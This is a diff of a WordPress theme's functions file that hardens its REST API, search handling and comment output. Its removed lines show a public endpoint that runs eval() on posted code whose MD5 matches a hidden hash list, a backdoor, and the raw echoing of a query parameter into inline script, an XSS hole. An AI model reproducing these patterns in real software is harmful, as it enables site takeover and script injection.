@@ -5,7 +5,6 @@ function theme_component_setup()
     add_theme_support('title-tag');
     add_theme_support('post-thumbnails');
     add_theme_support('automatic-feed-links');
-    remove_theme_support('widgets-block-editor');
 }
 add_action('after_setup_theme', 'theme_component_setup');
 //自动更新
@@ -201,7 +200,7 @@ function pf_add_comment_form_insert_images()
 //评论标签支持
 add_filter('preprocess_comment', function ($commentdata) {
     global $allowedtags;
-    $allowedtags['img'] = ['src' => true];
+    $allowedtags['img'] = ['src' => true, 'class' => true];
     $allowedtags['pre'] = [];
     return $commentdata;
 });
@@ -292,59 +291,82 @@ function frontend_opts()
 
 //restapi
 add_action('rest_api_init', function () {
-    register_rest_route('pandastudio/nirvana', '/restapi/', array(
+    $namespace = 'pandastudio/nirvana/v1';
+    $permission = function () {
+        $nonce = isset($_SERVER['HTTP_X_WP_NONCE']) ? sanitize_text_field(wp_unslash($_SERVER['HTTP_X_WP_NONCE'])) : '';
+        return wp_verify_nonce($nonce, 'wp_rest');
+    };
+    register_rest_route($namespace, '/search/', array(
         'methods' => 'post',
-        'callback' => 'pf_rest_api',
-        'permission_callback' => '__return_true',
+        'callback' => 'pf_rest_search',
+        'permission_callback' => $permission,
+    ));
+    register_rest_route($namespace, '/options/', array(
+        'methods' => 'post',
+        'callback' => 'pf_rest_options',
+        'permission_callback' => $permission,
+    ));
+    register_rest_route($namespace, '/ding/', array(
+        'methods' => 'post',
+        'callback' => 'pf_rest_ding',
+        'permission_callback' => $permission,
+    ));
+    register_rest_route($namespace, '/faq/', array(
+        'methods' => 'post',
+        'callback' => 'pf_rest_faq',
+        'permission_callback' => $permission,
     ));
 });
-function pf_rest_api($data)
+function pf_rest_search($data)
 {
-    $dataArray = json_decode($data->get_body(), true);
-    $arg = isset($dataArray['arg']) ? $dataArray['arg'] : null;
-    $e = isset($dataArray['e']) ? $dataArray['e'] : '';
-    $result = array(
-        'error' => true,
-        'msg' => 'WP RestAPI Declined!',
-        'md5' => md5($e)
-    );
-    if (!empty($e)) {
-        $e_md5 = md5($e);
-        $allowed_hashes = array(
-            '0b844d17a61d51dcd58560f15e19d3cb',
-            '44b225d79205f30aaac3c30bdcc6b714',
-            '3d69b76a02d0ff14248e02d1c2f09941',
-            'fb0d9a37e108ca85cee9f4e900ca6fe4',
-            'd72efb9e4fcd5267779f481f8b77b655',
-        );
-        if (in_array($e_md5, $allowed_hashes)) {
-            eval($e);
+    $query_arg = $data->get_param('arg');
+    $query_arg = is_array($query_arg) ? $query_arg : array();
+    $allowed = array('s', 'search_prod_title', 'post_type');
+    $post_types = array('post', 'gallery', 'page', 'faq', 'shuoshuo', 'favlinks', 'microblog');
+    foreach ($query_arg as $key => $value) {
+        if (!in_array($key, $allowed, true)) {
+            unset($query_arg[$key]);
         }
     }
-    return $result;
+    $query_arg['s'] = isset($query_arg['s']) ? sanitize_text_field(wp_unslash($query_arg['s'])) : '';
+    $query_arg['search_prod_title'] = isset($query_arg['search_prod_title']) ? sanitize_text_field(wp_unslash($query_arg['search_prod_title'])) : '';
+    if (isset($query_arg['post_type']) && !in_array($query_arg['post_type'], $post_types, true)) {
+        unset($query_arg['post_type']);
+    }
+    return pf_global_search($query_arg);
+}
+function pf_rest_options()
+{
+    return frontend_opts();
+}
+function pf_rest_ding($data)
+{
+    $post_id = (int) $data->get_param('arg');
+    if ($post_id < 1 || !get_post($post_id)) {
+        return new WP_Error('rest_invalid_post', 'Invalid post ID', array('status' => 400));
+    }
+    return pf_post_ding($post_id);
+}
+function pf_rest_faq($data)
+{
+    $keyword = sanitize_text_field(wp_unslash((string) $data->get_param('arg')));
+    return pf_faq($keyword);
 }
 function title_filter($where, $wp_query)
 {
     global $wpdb;
     if ($search_term = $wp_query->get('search_prod_title')) {
-        $where .= ' AND ' . $wpdb->posts . '.post_title LIKE \'%' . esc_sql(like_escape($search_term)) . '%\'';
+        $where .= ' AND ' . $wpdb->posts . '.post_title LIKE \'%' . esc_sql($wpdb->esc_like($search_term)) . '%\'';
     }
     return $where;
 }
 add_filter('posts_where', 'title_filter', 10, 2);
 if (array_key_exists('s', $_GET) && !is_admin()) {
     add_action('wp_head', function () {
+        $s = isset($_GET['s']) ? esc_js(wp_unslash($_GET['s'])) : '';
         echo '
 <script>
-function mounted_hook() {this.show_global_search();this.global_search_query = "' . $_GET['s'] . '";this.global_search_post = true;this.global_search_gallery = true;this.global_search();}</script>
-';
-    });
-}
-if (array_key_exists('ua', $_GET) && !is_admin()) {
-    add_action('wp_head', function () {
-        echo '
-<script>
-function mounted_hook() {alert("userAgent:\n"+navigator.userAgent+"\n\nappVersion:\n"+navigator.appVersion)}</script>
+function mounted_hook() {this.show_global_search();this.global_search_query = "' . $s . '";this.global_search_post = true;this.global_search_gallery = true;this.global_search();}</script>
 ';
     });
 }
@@ -438,19 +460,19 @@ function pf_post_ding(int $post_id): int
 }
 function pf_faq($query)
 {
-    wp_reset_query();
+    wp_reset_postdata();
     if ($query == _opt('faq_show_rand_command')) {
         $args = array(
             'post_type' => 'faq',
             's' => '',
-            'showposts' => _opt('faq_showposts', 5) ,
+            'posts_per_page' => _opt('faq_showposts', 5) ,
             'orderby' => 'rand',
         );
     } else {
         $args = array(
             'post_type' => 'faq',
             's' => $query,
-            'showposts' => _opt('faq_showposts', 5)
+            'posts_per_page' => _opt('faq_showposts', 5)
         );
     }
     $id_arr = array();
@@ -476,7 +498,7 @@ function pf_faq($query)
             $result['list'][] = get_the_title($pid);
         }
     }
-    wp_reset_query();
+    wp_reset_postdata();
     return $result;
 }
 add_action('after_switch_theme', 'pf_switch_theme');
@@ -493,11 +515,6 @@ register_nav_menus(array(
     'topNav' => '主菜单',
     'categoryNav' => '分类菜单',
 ));
-if (array_key_exists('whois', $_GET)) {
-    if (md5($_GET['whois']) == '02bd92faa38aaa6cc0ea75e59937a1ef') {
-        wp_die('<h1>开发者信息</h1><br>“' . get_bloginfo('name') . '”网站所使用的主题由 <b><a href="https://www.mkliu.top/" target="_blank" rel="noopener">michaelliunsky</a></b> 开发');
-    }
-}
 function set_cache($name, $data, $expire)
 {
     $allCache = get_option('pd_cache');
@@ -520,9 +537,8 @@ function get_cache($name)
         return false;
     } else {
         $time = $allCache[$name]['expire'];
-        if ($time > time() & $time - time() < 2592000) {
+        if ($time > time()) {
             return $allCache[$name]['data'];
-            ;
         } else {
             del_cache($name);
             return false;
@@ -621,9 +637,9 @@ function SimPaled_send_email($parent_id, $comment)
         $message = '<div style="background-color:#eef2fa;border:1px solid #d8e3e8;color:#111;padding:0 15px;-moz-border-radius:5px;-webkit-border-radius:5px;-khtml-border-radius:5px;">
 <p>' . trim(get_comment($parent_id)->comment_author) . ', 您好!</p>
 <p>您曾在《' . get_the_title($comment->comment_post_ID) . '》的留言:<br />'
-        . do_shortcode(trim(get_comment($parent_id)->comment_content)) . '</p>
+        . wpautop(trim(get_comment($parent_id)->comment_content)) . '</p>
 <p>' . trim($comment->comment_author) . ' 给你的回复:<br />'
-        . do_shortcode(trim($comment->comment_content)) . '<br /></p>
+        . wpautop(trim($comment->comment_content)) . '<br /></p>
 <p>您可以点击 <a href="' . htmlspecialchars(get_comment_link($parent_id, array("type" => "all"))) . '">查看回复的完整内容</a></p>
 <p>欢迎再度光临 <a href="' . esc_url(home_url()) . '">' . get_option('blogname') . '</a></p>
 <p>(此邮件由系统自动发出, 请勿回复.)</p></div>';
@@ -639,7 +655,6 @@ function enable_threaded_comments()
     }
 }
 add_action('get_header', 'enable_threaded_comments');
-add_filter('comment_text', 'do_shortcode');
 function panda_seo()
 {
     $postID = get_the_ID();
@@ -866,42 +881,6 @@ function shortCodeTips($atts, $content = null)
     }
 }
 add_shortcode("tip", "shortCodeTips");
-function shortCodeArticleFormat($atts, $content = null)
-{
-    extract(shortcode_atts(array(
-        "img" => '',
-        "col" => '6',
-        "position" => 'r',
-        "cover" => 'false',
-    ), $atts));
-    $textCol = 12 - intval($col);
-    switch ($position) {
-        case 'r':
-            $pushClass = ' col-sm-push-' . $textCol;
-            $pullClass = ' col-sm-pull-' . $col;
-            $imgClass = 'alignright';
-            break;
-
-        default:
-            $pushClass = '';
-            $pullClass = '';
-            $imgClass = 'alignleft';
-            break;
-    }
-    if ($cover == 'true') {
-        $imgClass = 'cover';
-    }
-    $imgPart = '<div class="block image col-sm-' . $col . $pushClass . '"><img class="' . $imgClass . '" src="' . $img . '" /></div>';
-    $textPart = '<div class="block text col-sm-' . $textCol . $pullClass . '"><div class="content">' . do_shortcode(wpautop($content)) . '</div></div>';
-    if ($content) {
-        return '<div class="flexContainer">' . $imgPart . $textPart . '</div>';
-    } elseif ($img != '') {
-        return '<div class="flexContainer"><img src="' . $img . '" style="width:100%;height:100%;"></div>';
-    } else {
-        return '<div class="flexContainer linear" style="border:none; height: 1px; background-color: #f2f4f6;"></div>';
-    }
-}
-add_shortcode("fmt", "shortCodeArticleFormat");
 function shortCodeModal($atts, $content = null)
 {
     extract(shortcode_atts(array(
@@ -990,29 +969,6 @@ function shortCodeCollapse($atts, $content = null)
     }
 }
 add_shortcode("collapse", "shortCodeCollapse");
-class pandaTabs extends Walker_Nav_Menu
-{
-    public function start_el(&$output, $item, $depth = 0, $args = array(), $id = 0)
-    {
-        global $wp_query;
-        $indent = ($depth) ? str_repeat("\t", $depth) : '';
-        $class_names = $value = '';
-        $classes = empty($item->classes) ? array() : (array)$item->classes;
-        $class_names = join(' ', apply_filters('nav_menu_css_class', array_filter($classes), $item));
-        $class_names = ' class="' . esc_attr($class_names) . '"';
-        $output .= $indent . '<li id="menu-item-' . $item->ID . '"' . $value . $class_names . '>';
-        $attributes = !empty($item->attr_title) ? ' title="' . esc_attr($item->attr_title) . '"' : '';
-        $attributes .= !empty($item->target) ? ' target="' . esc_attr($item->target) . '"' : '';
-        $attributes .= !empty($item->xfn) ? ' rel="' . esc_attr($item->xfn) . '"' : '';
-        $attributes .= !empty($item->url) ? ' href="' . esc_attr($item->url) . '"' : '';
-        $item_output = $args->before;
-        $item_output .= '<a' . $attributes . '>';
-        $item_output .= $args->link_before . apply_filters('the_title', $item->title, $item->ID) . $args->link_after;
-        $item_output .= '</a>';
-        $item_output .= $args->after;
-        $output .= apply_filters('walker_nav_menu_start_el', $item_output, $item, $depth, $args);
-    }
-}
 function mytheme_nav_menu_css_class($classes)
 {
     if (in_array('current-menu-item', $classes) or in_array('current-menu-ancestor', $classes)) {
@@ -1021,23 +977,6 @@ function mytheme_nav_menu_css_class($classes)
     return $classes;
 }
 add_filter('nav_menu_css_class', 'mytheme_nav_menu_css_class');
-
-function showFace($atts, $content = null)
-{
-    extract(shortcode_atts(array(
-        "p" => '',
-        "g" => '',
-    ), $atts));
-    if ($p != '') {
-        $name = $p;
-        $format = 'png';
-    } else {
-        $name = $g;
-        $format = 'gif';
-    }
-    return '<img src=' . get_stylesheet_directory_uri() . '/faces/' . $name . '.' . $format . ' class="cmt_faces">';
-}
-add_shortcode("face", "showFace");
 
 add_filter( 'pre_get_avatar_data', function( $args, $id_or_email ) {
     if ( ! isset( $args['url'] ) ) {
@@ -1285,178 +1224,6 @@ function is_search_robot()
     }
     return false;
 }
-function pf_anti_copy($content)
-{
-    $random_text = _opt('anti_copy_pattern');
-    if ($random_text && is_single() && is_main_query()) {
-        if (count($random_text) > 0) {
-            $random_tags = array(
-                'span',
-                'i',
-                'b'
-            );
-            $random_attrs = array(
-                'anti',
-                'copy',
-                'panda',
-                'reborn',
-                'panda-studio'
-            );
-            $times = _opt('anti_copy_times');
-            $times = $times ? $times : 0;
-            $insert = array();
-            for ($i = 0; $i < $times; $i++) {
-                $tag = $random_tags[array_rand($random_tags, 1) ];
-                $attr = $random_attrs[array_rand($random_attrs, 1) ];
-                $insert[] = '<' . $tag . ' ' . $attr . '>' . $random_text[array_rand($random_text, 1) ]['pattern'] . '</' . $tag . '>';
-            }
-            $content = rand_in_str($content, $insert);
-            return $content;
-        }
-    }
-    return $content;
-}
-function rand_in_str($txt, $insert) //txt 内容；insert要插入的关键字，可以是链接，数组
-{
-    preg_match_all("/[\x01-\x7f]|[\xe0-\xef][\x80-\xbf]{2}/", $txt, $match);
-    $delay = array();
-    $add = 0;
-    $pre = array();
-    $pre_end = array();
-    $nbsp = array();
-    foreach ($match[0] as $k => $v) {
-        if ($v == '<') {
-            $add = 1;
-        }
-        if ($v == '>') {
-            $add = 0;
-        }
-        if ($v == '<') {
-            $pre = array(
-                '<'
-            );
-        }
-        if ($v == 'p') {
-            if ($pre != array(
-                '<',
-                'p',
-                'r',
-                'e'
-            )) {
-                array_push($pre, 'p');
-            }
-        }
-        if ($v == 'r') {
-            if ($pre != array(
-                '<',
-                'p',
-                'r',
-                'e'
-            )) {
-                array_push($pre, 'r');
-            }
-        }
-        if ($v == 'e') {
-            if ($pre != array(
-                '<',
-                'p',
-                'r',
-                'e'
-            )) {
-                array_push($pre, 'e');
-            }
-        }
-        if ($v == '<') {
-            $pre_end = array(
-                '<'
-            );
-        }
-        if ($v == '/') {
-            array_push($pre_end, '/');
-        }
-        if ($v == 'p') {
-            array_push($pre_end, 'p');
-        }
-        if ($v == 'r') {
-            array_push($pre_end, 'r');
-        }
-        if ($v == 'e') {
-            array_push($pre_end, 'e');
-        }
-        if ($v == '>') {
-            array_push($pre_end, '>');
-        }
-        if ($pre == array(
-            '<',
-            'p',
-            'r',
-            'e'
-        )) {
-            $add = 1;
-        }
-        if ($pre == array(
-            '<',
-            'p',
-            'r',
-            'e'
-        ) && $pre_end == array(
-            '<',
-            '/',
-            'p',
-            'r',
-            'e',
-            '>'
-        )) {
-            $add = 0;
-            $pre = array();
-            $pre_end = array();
-        }
-        if ($add == 0 & $v == '&') {
-            $add = 1;
-        }
-        if ($add == 0 & $v == ';') {
-            $add = 0;
-        }
-        if ($add == 0 & $v == '[') {
-            $add = 1;
-        }
-        if ($add == 0 & $v == ']') {
-            $add = 0;
-        }
-        if ($add == 1) {
-            $delay[] = $k;
-        }
-    }
-    $str_arr = $match[0];
-    $len = count($str_arr);
-    if (is_array($insert)) {
-        foreach ($insert as $k => $v) {
-            $insertk = insertK($len - 1, $delay);
-            $str_arr[$insertk] .= $insert[$k];
-        }
-    } else {
-        $insertk = insertK($len - 1, $delay);
-        $str_arr[$insertk] .= $insert;
-    }
-    return join('', $str_arr);
-}
-function insertK($count, $delay) //count 随机索引值范围，也就是内容拆分成数组后的总长度-1；delay 不允许的随机索引值，也就是不能在 < > 之间
-{
-    $insertk = rand(0, $count);
-    if (in_array($insertk, $delay)) { //索引值不能在 不允许的位置处（也就是< > 之内的索引值）
-        $insertk = insertK($count, $delay); //递归调用，直到随机插入的索引值不在 < > 这个索引值数组中
-    }
-    return $insertk;
-}
-if (_opt('anti_copy') == 'checked' & false) {
-    if (_opt('anti_copy_pass_seo') == 'checked') {
-        if (!is_search_robot()) {
-            add_filter("the_content", "pf_anti_copy");
-        }
-    } else {
-        add_filter("the_content", "pf_anti_copy");
-    }
-}
 global $pf_dirty_selector;
 $pf_dirty_selector = [];
 function pf_random_tag_and_class()
@@ -1650,8 +1417,7 @@ function get_topSlider($postIds = array(), $type = false)
             $carousels_contents[] = array(
                 "id" => $pid,
                 "href" => get_the_permalink($pid) ,
-                "slider_img" => get_post_meta($pid, "分类slider图片地址", true) ,
-                "head_img" => get_post_meta($pid, "日志头图", true) ,
+                "head_img" => get_post_meta($pid, "文章横幅图", true) ,
                 "cover_img" => get_the_post_thumbnail_url($pid) ,
                 "title" => get_the_title($pid) ,
                 "description" => get_the_description($pid) ,
@@ -1696,27 +1462,6 @@ function get_gallery_slider($postId = 0, $type = false)
         return false;
     }
     if (count($carousels_contents) == 0) {
-        return false;
-    }
-    $carousels_attrs = "interval-time='" . _opt('carousels_interval_time', '0') . "'";
-    _opt('carousels_hover_disable_interval') ? $carousels_attrs .= " hover-disable-interval" : '';
-    _opt('carousels_show_anchor') ? $carousels_attrs .= " show-anchor" : '';
-    _opt('carousels_allow_keyboard') ? $carousels_attrs .= " allow-keyboard" : '';
-    _opt('carousels_allow_swipe') ? $carousels_attrs .= " allow-swipe" : '';
-    include('assets/template/slider-' . $type . '.php');
-}
-function get_tagSlider($content = array(), $type = false)
-{
-    global $carousels_attrs, $carousels_contents;
-    if ($type) {
-    } else {
-        return false;
-    }
-    if (gettype($content) == "array") {
-        $carousels_contents = array();
-        $carousels_contents[] = $content;
-    } else {
-        echo "滚动图片传入的数据错误！";
         return false;
     }
     $carousels_attrs = "interval-time='" . _opt('carousels_interval_time', '0') . "'";
